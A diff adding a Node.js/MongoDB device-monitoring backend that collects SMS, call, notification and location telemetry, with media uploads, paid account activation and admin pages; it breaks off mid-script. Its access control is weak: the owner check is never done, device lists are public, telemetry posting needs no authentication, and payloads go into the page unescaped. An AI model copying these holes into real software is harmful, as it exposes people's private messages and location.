@@ -1,0 +1,3709 @@
+Backend/.env.exemplo
+PORT=3000
+MONGO_URI=mongodb://localhost:27017/devicemgr
+JWT_SECRET=change_this_secret
+SEED_ADMIN_EMAIL=admin@example.com
+SEED_ADMIN_PASS=admin123   ADMIN_REGISTRATION_SECRET=put_a_strong_secret_here
+
+Backend/ package.json
+{
+  "name": "devicemgr-backend",
+  "version": "1.0.0",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js",
+    "dev": "nodemon server.js"
+  },
+  "dependencies": {
+    "bcrypt": "^5.1.0",
+    "cors": "^2.8.5",
+    "dotenv": "^16.0.3",
+    "express": "^4.18.2",
+    "jsonwebtoken": "^9.0.0",
+    "mongoose": "^6.8.0",
+    "multer": "^1.4.5-lts.1",
+    "socket.io": "^4.7.2",
+    "crypto": "^1.0.1"
+  }
+}
+Backend /server.js
+require('dotenv').config();
+const express = require('express');
+const http = require('http');
+const cors = require('cors');
+const mongoose = require('mongoose');
+const path = require('path');
+
+const app = express();
+const server = http.createServer(app);
+
+// socket.io
+const { Server } = require('socket.io');
+const io = new Server(server, { cors: { origin: '*' } });
+app.set('io', io);
+
+app.use(cors());
+app.use(express.json({ limit: '20mb' }));
+
+// connect mongo
+const MONGO = process.env.MONGO_URI || 'mongodb://localhost:27017/devicemgr';
+mongoose.connect(MONGO, { useNewUrlParser: true, useUnifiedTopology: true })
+  .then(() => {
+    console.log('Connected to MongoDB');
+
+    // gridfs bucket
+    const mongodb = require('mongodb');
+    const conn = mongoose.connection;
+    const gridfsBucket = new mongodb.GridFSBucket(conn.db, { bucketName: 'media' });
+    app.set('gridfsBucket', gridfsBucket);
+  })
+  .catch(err => { console.error('Mongo connection error', err); process.exit(1); });
+
+// routes
+app.use('/api', require('./src/routes'));
+
+// static frontend
+app.use('/', express.static(path.join(__dirname, '../web-frontend')));
+
+// error / fallback
+app.use((req, res) => res.status(404).json({ error: 'not_found' }));
+
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => console.log('Server listening on', PORT));
+
+
+Backend / src/config/ índex.js
+module.exports = {
+  jwtSecret: process.env.JWT_SECRET || 'change_this_secret',
+  mongoUri: process.env.MONGO_URI || 'mongodb://localhost:27017/devicemgr',
+  port: process.env.PORT || 3000
+};
+
+Backend / src/ controllers/ auth.controller.js
+const jwt = require('jsonwebtoken');
+const bcrypt = require('bcrypt');
+const User = require('../models/user.model');
+const config = require('../config');
+ 
+
+/**
+ * register user (normal)
+ */
+exports.register = async (req, res) => {
+  try {
+    const { email, password, name } = req.body;
+    if (!email || !password) return res.status(400).json({ error: 'missing_fields' });
+    const existing = await User.findOne({ email });
+    if (existing) return res.status(400).json({ error: 'exists' });
+    const hash = await bcrypt.hash(password, 10);
+    const u = new User({ email, passwordHash: hash, name });
+    await u.save();
+    res.json({ ok: true });
+  } catch (err) {
+    console.error('register error', err);
+    res.status(500).json({ error: 'server_error' });
+  }
+};
+
+/**
+ * login - returns JWT
+ */
+exports.login = async (req, res) => {
+  try {
+    const { email, password } = req.body;
+    if (!email || !password) return res.status(400).json({ error: 'missing_fields' });
+    const u = await User.findOne({ email });
+    if (!u) return res.status(401).json({ error: 'invalid_credentials' });
+    const ok = await bcrypt.compare(password, u.passwordHash);
+    if (!ok) return res.status(401).json({ error: 'invalid_credentials' });
+    const payload = { id: u._id.toString(), role: u.role, email: u.email };
+    const token = jwt.sign(payload, config.jwtSecret, { expiresIn: '30d' });
+    res.json({ token, userId: u._id.toString(), role: u.role, active: u.active });
+  } catch (err) {
+    console.error('login error', err);
+    res.status(500).json({ error: 'server_error' });
+  }
+};
+
+/**
+ * me - returns payload from middleware
+ */
+// topo do ficheiro (assegura que existe)
+
+// substitui exports.me por:
+exports.me = async (req, res) => {
+  try {
+    const payload = req.user;
+    if (!payload || !payload.id) return res.status(401).json({ ok:false, error:'no_auth' });
+
+    // busca o utilizador no BD para incluir campo active, name, etc.
+    const user = await User.findById(payload.id).select('-passwordHash').lean();
+    if (!user) return res.status(404).json({ ok:false, error:'not_found' });
+
+    res.json({ ok: true, user });
+  } catch (err) {
+    console.error('me error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+
+/**
+ * registerAdmin - create admin account securely
+ *
+ * Two ways to authorize:
+ * 1) Provide header x-admin-secret equal to ADMIN_REGISTRATION_SECRET in env
+ * 2) Call with Authorization: Bearer <token> where token belongs to an existing admin
+ *
+ * Request body: { email, password, name } (plus optional adminSecret if using body secret)
+ */
+exports.registerAdmin = async (req, res) => {
+  try {
+    // admin secret from env (may be undefined)
+    const adminSecretEnv = process.env.ADMIN_REGISTRATION_SECRET || null;
+    const providedSecretHeader = (req.headers['x-admin-secret'] || '').toString();
+    const providedSecretBody = (req.body && req.body.adminSecret) ? req.body.adminSecret.toString() : '';
+
+    let allowed = false;
+
+    // 1) if env secret exists and matches provided header or body -> allow
+    if (adminSecretEnv && (providedSecretHeader === adminSecretEnv || providedSecretBody === adminSecretEnv)) {
+      allowed = true;
+    } else {
+      // 2) else try to authenticate caller via JWT and check role === 'admin'
+      const authHeader = (req.headers.authorization || '').toString();
+      let token = null;
+      if (authHeader.startsWith('Bearer ')) token = authHeader.slice(7);
+      else if (authHeader.length > 0) token = authHeader; // fallback
+
+      if (token) {
+        try {
+          const payload = jwt.verify(token, config.jwtSecret);
+          if (payload && payload.role === 'admin') allowed = true;
+        } catch (e) {
+          // invalid token -> allowed remains false
+          allowed = false;
+        }
+      }
+    }
+
+    if (!allowed) return res.status(403).json({ ok:false, error: 'forbidden' });
+
+    // validate input
+    const { email, password, name } = req.body;
+    if (!email || !password) return res.status(400).json({ ok:false, error: 'missing_fields' });
+
+    // avoid duplicates
+    const existing = await User.findOne({ email });
+    if (existing) return res.status(400).json({ ok:false, error: 'exists' });
+
+    const hash = await bcrypt.hash(password, 10);
+    const u = new User({
+      email,
+      passwordHash: hash,
+      name: name || '',
+      role: 'admin',
+      active: true
+    });
+
+    await u.save();
+
+    // respond with minimal info
+    res.json({ ok:true, userId: u._id.toString(), email: u.email });
+  } catch (err) {
+    console.error('registerAdmin error', err);
+    res.status(500).json({ ok:false, error: 'server_error' });
+  }
+};
+
+
+
+
+Backend / src/ controllers/ devices.controller.js
+const Device = require('../models/device.model');
+
+/**
+ * list (all devices)
+ */
+exports.list = async (req, res) => {
+  try {
+    const devices = await Device.find().sort({ lastSeen: -1 }).lean();
+    res.json({ ok: true, devices });
+  } catch (err) {
+    console.error('devices.list error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+/**
+ * get single device
+ */
+exports.get = async (req, res) => {
+  try {
+    const d = await Device.findOne({ deviceId: req.params.deviceId }).lean();
+    if (!d) return res.status(404).json({ ok:false, error:'not_found' });
+    res.json({ ok:true, device: d });
+  } catch (err) {
+    console.error('devices.get error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+/**
+ * list devices owned by authenticated user
+ */
+exports.listMy = async (req, res) => {
+  try {
+    const userId = req.user && req.user.id;
+    if (!userId) return res.status(401).json({ ok:false, error:'not_authenticated' });
+    const devices = await Device.find({ owner: userId }).sort({ lastSeen: -1 }).lean();
+    res.json({ ok: true, devices });
+  } catch (err) {
+    console.error('devices.listMy error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+/**
+ * claim a device (set owner = current user) if unowned
+ * POST /api/devices/:deviceId/claim
+ */
+exports.claim = async (req, res) => {
+  try {
+    const userId = req.user && req.user.id;
+    if (!userId) return res.status(401).json({ ok:false, error:'not_authenticated' });
+    const deviceId = req.params.deviceId;
+    if (!deviceId) return res.status(400).json({ ok:false, error:'missing_device' });
+
+    const device = await Device.findOne({ deviceId });
+    if (!device) return res.status(404).json({ ok:false, error:'not_found' });
+
+    if (device.owner && device.owner.toString() !== userId) {
+      return res.status(403).json({ ok:false, error:'already_claimed' });
+    }
+
+    device.owner = userId;
+    await device.save();
+
+    res.json({ ok:true, deviceId: device.deviceId, owner: device.owner.toString() });
+  } catch (err) {
+    console.error('devices.claim error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+
+Backend / src/ controllers/ media.controller.js
+// rUpload to GridFS, checksum endpoints, download
+const crypto = require('crypto');
+const mongoose = require('mongoose');
+const mongodb = require('mongodb');
+ 
+function sha256(buffer) {
+  return crypto.createHash('sha256').update(buffer).digest('hex');
+}
+
+exports.upload = async (req, res) => {
+  try {
+    // multer has put file in req.file.buffer (we will use memoryStorage)
+    const file = req.file;
+    const deviceId = req.params.deviceId;
+    if (!file) return res.status(400).json({ ok:false, error:'no_file' });
+    if (!deviceId) return res.status(400).json({ ok:false, error:'missing_device' });
+
+    const gridfsBucket = req.app.get('gridfsBucket');
+    if (!gridfsBucket) return res.status(500).json({ ok:false, error:'gridfs_not_ready' });
+
+    const checksum = sha256(file.buffer);
+
+    // check existing by metadata checksum (search in files collection)
+    const filesColl = mongoose.connection.db.collection('media.files');
+    const existing = await filesColl.findOne({ 'metadata.checksum': checksum });
+    if (existing) {
+      return res.json({ ok:true, exists:true, fileId: existing._id.toString() });
+    }
+
+    const uploadStream = gridfsBucket.openUploadStream(file.originalname, {
+      contentType: file.mimetype,
+      metadata: {
+        originalname: file.originalname,
+        deviceId,
+        checksum
+      }
+    });
+
+    uploadStream.end(file.buffer);
+
+    uploadStream.on('finish', () => {
+      res.json({ ok:true, fileId: uploadStream.id.toString(), checksum });
+    });
+
+    uploadStream.on('error', (err) => {
+      console.error('gridfs upload error', err);
+      res.status(500).json({ ok:false, error:'upload_failed' });
+    });
+  } catch (err) {
+    console.error('media.upload error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+exports.checksum = async (req, res) => {
+  try {
+    const { checksum } = req.body;
+    if (!checksum) return res.status(400).json({ ok:false, error:'missing_checksum' });
+    const filesColl = mongoose.connection.db.collection('media.files');
+    const existing = await filesColl.findOne({ 'metadata.checksum': checksum });
+    res.json({ ok:true, exists: !!existing, fileId: existing ? existing._id.toString() : null });
+  } catch (err) {
+    console.error('media.checksum error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+exports.download = async (req, res) => {
+  try {
+    const fileId = req.params.fileId;
+    const gridfsBucket = req.app.get('gridfsBucket');
+    if (!gridfsBucket) return res.status(500).json({ ok:false, error:'gridfs_not_ready' });
+
+    const _id = new mongodb.ObjectId(fileId);
+    const filesColl = mongoose.connection.db.collection('media.files');
+    const meta = await filesColl.findOne({ _id });
+    if (!meta) return res.status(404).json({ ok:false, error:'not_found' });
+
+    res.set('Content-Type', meta.contentType || 'application/octet-stream');
+    res.set('Content-Disposition', 'attachment; filename="' + (meta.filename || 'file') + '"');
+
+    const downloadStream = gridfsBucket.openDownloadStream(_id);
+    downloadStream.pipe(res);
+    downloadStream.on('error', (err) => {
+      console.error('gridfs download error', err);
+      res.status(500).end();
+    });
+  } catch (err) {
+    console.error('media.download error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};                
+
+exports.listByDevice = async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    if (!deviceId) return res.status(400).json({ ok:false, error:'missing_device' });
+
+    const filesColl = mongoose.connection.db.collection('media.files');
+    const docs = await filesColl.find({ 'metadata.deviceId': deviceId }).sort({ uploadDate: -1 }).toArray();
+
+    const files = docs.map(d => ({
+      fileId: d._id.toString(),
+      filename: d.filename,
+      contentType: d.contentType,
+      uploadDate: d.uploadDate,
+      metadata: d.metadata || {}
+    }));
+
+    res.json({ ok:true, files });
+  } catch (err) {
+    console.error('media.listByDevice error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+
+Backend / src/ controllers/ payments.controller.js
+const Payment = require('../models/payment.model');
+const User = require('../models/user.model');
+
+exports.create = async (req, res) => {
+  try {
+    const { amount, method, note, mediaFileId } = req.body;
+    const userId = req.user && req.user.id;
+    if (!userId) return res.status(401).json({ ok:false, error:'not_authenticated' });
+    const p = new Payment({ user: userId, amount, method, note, mediaFileId, status: 'pending' });
+    await p.save();
+    res.json({ ok:true, id: p._id });
+  } catch (err) {
+    console.error('payments.create error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+exports.list = async (req, res) => {
+  try {
+    const payments = await Payment.find().sort({ createdAt: -1 }).populate('user','email name').lean();
+    res.json({ ok: true, payments });
+  } catch (err) {
+    console.error('payments.list error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+exports.listMine = async (req, res) => {
+  try {
+    const userId = req.user && req.user.id;
+    if (!userId) return res.status(401).json({ ok:false, error:'not_authenticated' });
+    const payments = await Payment.find({ user: userId }).sort({ createdAt: -1 }).lean();
+    res.json({ ok:true, payments });
+  } catch (err) {
+    console.error('payments.listMine error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+exports.process = async (req, res) => {
+  try {
+    const id = req.params.id;
+    const action = req.body.action;
+    const payment = await Payment.findById(id);
+    if (!payment) return res.status(404).json({ ok:false, error:'not_found' });
+    if (action === 'approve') {
+      payment.status = 'completed';
+      payment.processedAt = new Date();
+      payment.processedBy = req.user.id;
+      await payment.save();
+      await User.updateOne({_id: payment.user}, { $set: { active: true }});
+      return res.json({ ok: true });
+    } else {
+      payment.status = 'rejected';
+      payment.processedAt = new Date();
+      payment.processedBy = req.user.id;
+      await payment.save();
+      return res.json({ ok: true });
+    }
+  } catch (err) {
+    console.error('payments.process error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+      
+
+
+
+Backend / src/ controllers/ telemetry.controller.js
+const Telemetry = require('../models/telemetry.model');
+const Device = require('../models/device.model');
+
+exports.post = async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const payload = req.body;
+    if (!deviceId) return res.status(400).json({ ok:false, error:'missing_device' });
+
+    const t = new Telemetry({ deviceId, payload, ts: new Date() });
+    await t.save();
+
+    await Device.updateOne({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: true });
+
+    try {
+      const io = req.app.get('io');
+      io.to('device_' + deviceId).emit('telemetry', { deviceId, payload, ts: new Date() });
+    } catch (e) {
+      console.error('socket emit error', e);
+    }
+
+    res.json({ ok:true, id: t._id });
+  } catch (err) {
+    console.error('telemetry.post error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+// list by optional type (query param ?type=notification|telemetry|sms|call)
+exports.listByType = async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const type = req.query.type; // optional
+    if (!deviceId) return res.status(400).json({ ok:false, error:'missing_device' });
+
+    const q = { deviceId };
+    if (type) q['payload.type'] = type;
+
+    const docs = await Telemetry.find(q).sort({ ts: -1 }).limit(500).lean();
+    res.json({ ok:true, total: docs.length, items: docs });
+  } catch (err) {
+    console.error('telemetry.listByType error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+exports.history = async (req, res) => {
+  try {
+    const deviceId = req.params.deviceId;
+    const docs = await Telemetry.find({ deviceId }).sort({ ts: -1 }).limit(100).lean();
+    res.json({ ok:true, total: docs.length, items: docs });
+  } catch (err) {
+    console.error('telemetry.history error', err);
+    res.status(500).json({ ok:false, error:'server_error' });
+  }
+};
+
+
+Backend / src/ middleware/ auth.middleware.js
+const jwt = require('jsonwebtoken');
+const config = require('../config');
+const User = require('../models/user.model');
+
+const getTokenFromHeader = (req) => {
+  const auth = req.headers.authorization;
+  if (!auth) return null;
+  const parts = auth.split(' ');
+  if (parts.length !== 2) return null;
+  return parts[1];
+};
+
+exports.requireAuth = async (req, res, next) => {
+  try {
+    const token = getTokenFromHeader(req);
+    if (!token) return res.status(401).json({ error: 'no_token' });
+    const payload = jwt.verify(token, config.jwtSecret);
+    req.user = payload;
+    next();
+  } catch (err) {
+    console.error('requireAuth error', err);
+    return res.status(401).json({ error: 'invalid_token' });
+  }
+};
+
+exports.adminOnly = async (req, res, next) => {
+  try {
+    await exports.requireAuth(req, res, async () => {
+      if (req.user.role !== 'admin') return res.status(403).json({ error:'forbidden' });
+      next();
+    });
+  } catch (err) {
+    console.error('adminOnly error', err);
+    return res.status(401).json({ error:'invalid_token' });
+  }
+};
+
+exports.adminOrOwner = async (req, res, next) => {
+  try {
+    await exports.requireAuth(req, res, async () => {
+      if (req.user.role === 'admin') return next();
+      // owner check may be implemented by controllers that know device->owner mapping
+      next();
+    });
+  } catch (err) {
+    console.error('adminOrOwner error', err);
+    return res.status(401).json({ error:'invalid_token' });
+  }
+};
+
+Backend / src/ models/ device.model.js
+const mongoose = require('mongoose');
+const Schema = mongoose.Schema;
+
+const DeviceSchema = new Schema({
+  deviceId: { type: String, unique: true, required: true },
+  owner: { type: Schema.Types.ObjectId, ref: 'User', default: null },
+  name: String,
+  consent: {
+    accepted: Boolean,
+    ts: Date,
+    textVersion: String
+  },
+  lastSeen: Date,
+  createdAt: { type: Date, default: Date.now }
+});
+
+module.exports = mongoose.model('Device', DeviceSchema);
+
+Backend / src/ models/ payment.model.js
+const mongoose = require('mongoose');
+const Schema = mongoose.Schema;
+
+const PaymentSchema = new Schema({
+  user: { type: Schema.Types.ObjectId, ref: 'User', required: true },
+  amount: Number,
+  currency: { type: String, default: 'USD' },
+  status: { type: String, enum: ['pending','completed','rejected'], default: 'pending' },
+  method: String,
+  note: String,
+  mediaFileId: { type: String, default: null }, // GridFS file id for receipt
+  createdAt: { type: Date, default: Date.now },
+  processedAt: Date,
+  processedBy: { type: Schema.Types.ObjectId, ref: 'User' }
+});
+
+module.exports = mongoose.model('Payment', PaymentSchema);
+
+Backend / src/ models/telemetry.model.js
+const mongoose = require('mongoose');
+const Schema = mongoose.Schema;
+
+const TelemetrySchema = new Schema({
+  deviceId: { type: String, required: true, index: true },
+  payload: { type: Schema.Types.Mixed },
+  ts: { type: Date, default: Date.now }
+}, { collection: 'telemetries' });
+
+module.exports = mongoose.model('Telemetry', TelemetrySchema);
+
+Backend / src/ routes/ auth.routes.js
+const express = require('express');
+const router = express.Router();
+const ctrl = require('../controllers/auth.controller');
+const authmw = require('../middleware/auth.middleware');
+
+router.post('/register', ctrl.register);
+router.post('/login', ctrl.login);
+router.get('/me', authmw.requireAuth, ctrl.me);
+
+// rota para registar admins (verifica x-admin-secret ou token admin)
+router.post('/register-admin', ctrl.registerAdmin);
+
+module.exports = router;
+
+
+
+Backend / src/ routes/ devices.routes.js
+const express = require('express');
+const router = express.Router();
+const ctrl = require('../controllers/devices.controller');
+const auth = require('../middleware/auth.middleware');
+
+// public list for debugging
+router.get('/public', ctrl.list);
+
+// compatibility: /api/devices returns list (admin uses this)
+router.get('/', ctrl.list);
+
+// devices owned by current authenticated user
+router.get('/my', auth.requireAuth, ctrl.listMy);
+
+// claim device (authenticated user)
+router.post('/:deviceId/claim', auth.requireAuth, ctrl.claim);
+
+// get single device by id
+router.get('/:deviceId', auth.adminOrOwner, ctrl.get);
+
+module.exports = router;
+
+
+
+Backend / src/ routes/ índex.js
+const express = require('express');
+const router = express.Router();
+
+router.use('/auth', require('./auth.routes'));
+router.use('/devices', require('./devices.routes'));
+router.use('/telemetry', require('./telemetry.routes'));
+router.use('/payments', require('./payments.routes'));
+router.use('/media', require('./media.routes'));
+
+module.exports = router;
+
+
+Backend / src/ routes/ media.routes.js
+const express = require('express');
+const multer = require('multer');
+const router = express.Router();
+const ctrl = require('../controllers/media.controller');
+const auth = require('../middleware/auth.middleware');
+// after existing routes
+
+// u 9k.se memory storage to compute checksum easily
+const storage = multer.memoryStorage();
+const upload = multer({ storage: storage, limits: { fileSize: 50 * 1024 * 1024 } }); // 50MB limit
+
+// lista ficheiros de um device (admin ou owner)
+router.get('/list/:deviceId', auth.adminOrOwner, ctrl.listByDevice);
+
+// upload media for device (requires auth)
+router.post('/:deviceId/upload', auth.requireAuth, upload.single('media'), ctrl.upload);
+
+// checksum check (body: { checksum })
+router.post('/checksum', auth.requireAuth, ctrl.checksum);
+
+// download file
+router.get('/download/:fileId', auth.requireAuth, ctrl.download);
+
+module.exports = router;
+
+
+Backend / src/ routes/ payments.routes.js
+const express = require('express');
+const router = express.Router();
+const ctrl = require('../controllers/payments.controller');
+const auth = require('../middleware/auth.middleware');
+
+router.post('/', auth.requireAuth, ctrl.create);
+
+// list all payments (admin)
+router.get('/', auth.adminOnly, ctrl.list);
+
+// list my payments
+router.get('/mine', auth.requireAuth, ctrl.listMine);
+
+// process payment (admin)
+router.post('/:id/process', auth.adminOnly, ctrl.process);
+
+module.exports = router;
+
+
+Backend / src/ routes/ telemetry.routes.js
+const express = require('express');
+const router = express.Router();
+const ctrl = require('../controllers/telemetry.controller');
+const auth = require('../middleware/auth.middleware');
+
+// Receiving telemetry (unauthenticated allowed for now)
+router.post('/:deviceId', ctrl.post);
+router.get('/:deviceId/history', auth.adminOrOwner, ctrl.history);
+// GET /api/telemetry/:deviceId/items?type=notification
+router.get('/:deviceId/items', auth.adminOrOwner, ctrl.listByType);
+
+module.exports = router;
+
+web-frontend/adimin/device.html
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/><title>Device View</title>
+  <link rel="stylesheet" href="/css/styles.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <style>#map{height:420px;margin-bottom:8px}</style>
+</head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between">
+      <h1>Device</h1>
+      <div><a href="/admin/index.html">Back</a> <button id="logout">Logout</button></div>
+    </header>
+
+    <div class="card" id="deviceInfo">Loading device...</div>
+    <div id="map" class="card"></div>
+    <div class="card">
+      <h3>History</h3>
+      <ul id="historyList" style="list-style:none;padding-left:0"></ul>
+    </div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const deviceId = params.get('deviceId');
+    if (!deviceId) { alert('deviceId missing'); location.href='/admin/index.html'; }
+    const token = localStorage.getItem('auth_token');
+    if (!token) { alert('not logged'); location.href='/'; }
+
+    const headers = { 'Authorization': 'Bearer ' + token };
+
+    async function loadDevice(){
+      const r = await apiFetch('/api/devices/' + encodeURIComponent(deviceId), { method:'GET' });
+      const el = document.getElementById('deviceInfo');
+      if (!r.ok) { el.innerText = 'Erro: ' + (r.error || JSON.stringify(r)); return; }
+      const d = r.device;
+      el.innerHTML = `<strong>DeviceId:</strong> ${d.deviceId} <br>
+                      <strong>Name:</strong> ${d.name || '-'} <br>
+                      <strong>Owner:</strong> ${d.owner || '-'} <br>
+                      <strong>Last seen:</strong> ${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : '-'}`;
+    }
+
+    // history
+    async function loadHistory(){
+      const r = await apiFetch('/api/telemetry/' + encodeURIComponent(deviceId) + '/history', { method:'GET' });
+      const ul = document.getElementById('historyList');
+      ul.innerHTML = '';
+      if (!r.ok) { ul.innerHTML = '<li>Erro: ' + (r.error||JSON.stringify(r)) + '</li>'; return; }
+      r.items.forEach(item => {
+        const li = document.createElement('li');
+        const ts = new Date(item.ts).toLocaleString();
+        const payload = JSON.stringify(item.payload);
+        li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small class="small">${ts}</small><div>${payload}</div></div>`;
+        ul.appendChild(li);
+      });
+      return r.items;
+    }
+
+    // map init
+    let map, marker;
+    function initMap(lat=0, lon=0) {
+      if (!map) {
+        map = L.map('map').setView([lat, lon], lat===0&&lon===0?2:13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+        marker = L.marker([lat, lon]).addTo(map);
+      } else {
+        map.setView([lat, lon], 13);
+        marker.setLatLng([lat, lon]);
+      }
+    }
+
+    (async function(){
+      await loadDevice();
+      const items = await loadHistory();
+      if (items && items.length>0) {
+        const first = items[0];
+        const loc = first.payload && first.payload.location;
+        if (loc && loc.lat && loc.lon) initMap(loc.lat, loc.lon);
+        else initMap(0,0);
+      } else initMap(0,0);
+
+      // socket
+      const socket = io();
+      socket.emit('join_device_room', deviceId);
+      socket.on('telemetry', (data) => {
+        if (data && data.payload && data.payload.location) {
+          const loc = data.payload.location;
+          initMap(loc.lat, loc.lon);
+          const ul = document.getElementById('historyList');
+          const li = document.createElement('li');
+          li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small class="small">${new Date(data.ts).toLocaleString()}</small><div>${JSON.stringify(data.payload)}</div></div>`;
+          ul.insertBefore(li, ul.firstChild);
+        }
+      });
+
+      document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    })();
+  </script>
+</body>
+                                                         </html>
+                  
+
+web-frontend/adimin/index.html
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/><title>Admin Dashboard</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <link rel="stylesheet" href="/css/styles.css">
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between;align-items:center">
+      <h1>Admin Dashboard</h1>
+      <div>
+        <button id="btnRefresh">Refresh</button>
+        <button id="logout">Logout</button>
+      </div>
+    </header>
+
+    <section class="card">
+      <h2>Devices</h2>
+      <input id="deviceSearch" placeholder="Procurar DeviceId, nome ou owner"/>
+      <table id="devicesTable" style="width:100%;border-collapse:collapse;margin-top:8px">
+        <thead>
+          <tr><th>DeviceId</th><th>Name</th><th>Owner</th><th>Last Seen</th><th>Ações</th></tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </section>
+
+    <section class="card" style="margin-top:16px">
+      <h2>Payments</h2>
+      <table id="paymentsTable" style="width:100%;border-collapse:collapse;margin-top:8px">
+        <thead>
+          <tr><th>ID</th><th>User</th><th>Amount</th><th>Status</th><th>Created</th><th>Ações</th></tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+    </section>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    const token = localStorage.getItem('auth_token');
+    if (!token) { alert('not logged'); location.href='/'; }
+
+    async function loadDevices() {
+      const res = await apiFetch('/api/devices', { method:'GET' });
+      const tbody = document.querySelector('#devicesTable tbody');
+      tbody.innerHTML = '';
+      if (!res.ok) { tbody.innerHTML = '<tr><td colspan="5">Erro: ' + (res.error||JSON.stringify(res)) + '</td></tr>'; return; }
+      res.devices.forEach(d => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td style="padding:6px;border-bottom:1px solid #eee">${d.deviceId}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${d.name || ''}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${d.owner || ''}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : '-'}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">
+            <button data-id="${d.deviceId}" class="btnView">Ver</button>
+          </td>
+        `;
+        tbody.appendChild(tr);
+      });
+
+      // attach handlers
+      // assume contexto: no admin -> leva para /admin/device.html, no user -> /user/device.html
+document.querySelectorAll('.btnView').forEach(b => {
+  b.addEventListener('click', () => {
+    const id = b.getAttribute('data-id');
+    // detecta se estamos no admin ou user pela URL atual
+    const path = window.location.pathname;
+    if (path.indexOf('/admin/') === 0 || path.indexOf('/admin') === 0) {
+      window.location = '/admin/device.html?deviceId=' + encodeURIComponent(id);
+    } else {
+      window.location = '/user/device.html?deviceId=' + encodeURIComponent(id);
+    }
+  });
+});
+
+    }
+
+    async function loadPayments() {
+      const res = await apiFetch('/api/payments', { method:'GET' });
+      const tbody = document.querySelector('#paymentsTable tbody');
+      tbody.innerHTML = '';
+      if (!res.ok) { tbody.innerHTML = '<tr><td colspan="6">Erro: ' + (res.error||JSON.stringify(res)) + '</td></tr>'; return; }
+      res.payments.forEach(p => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td style="padding:6px;border-bottom:1px solid #eee">${p._id}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${(p.user && (p.user.email || p.user)) || ''}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${p.amount || ''} ${p.currency || ''}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${p.status}</td>
+          <td style="padding:6px;border-bottom:1px solid #eee">${new Date(p.createdAt).toLocaleString()}</td>
+          // dentro de res.payments.forEach(p => { ... })
+<td style="padding:6px;border-bottom:1px solid #eee">
+  ${p.status === 'pending' ? `<button data-id="${p._id}" class="btnApprove">Aprovar</button><button data-id="${p._id}" class="btnReject">Rejeitar</button>` : '-'}
+  ${p.mediaFileId ? `<button class="btnViewMedia" data-fileid="${p.mediaFileId}">Ver comprovativo</button>` : ''}
+</td>
+
+        `;
+        tbody.appendChild(tr);
+      });
+
+      document.querySelectorAll('.btnApprove').forEach(b => {
+        b.addEventListener('click', async () => {
+          if (!confirm('Aprovar pagamento?')) return;
+          const id = b.getAttribute('data-id');
+          const res = await apiFetch('/api/payments/' + encodeURIComponent(id) + '/process', { method:'POST', body: { action:'approve' } });
+          if (res.ok) { alert('Aprovado'); loadPayments(); }
+          else alert('Erro: ' + (res.error || JSON.stringify(res)));
+        });
+      });
+
+      document.querySelectorAll('.btnReject').forEach(b => {
+        b.addEventListener('click', async () => {
+          if (!confirm('Rejeitar pagamento?')) return;
+          const id = b.getAttribute('data-id');
+          const res = await apiFetch('/api/payments/' + encodeURIComponent(id) + '/process', { method:'POST', body: { action:'reject' } });
+          if (res.ok) { alert('Rejeitado'); loadPayments(); }
+          else alert('Erro: ' + (res.error || JSON.stringify(res)));
+        });
+      });
+document.querySelectorAll('.btnViewMedia').forEach(b => {
+  b.addEventListener('click', async () => {
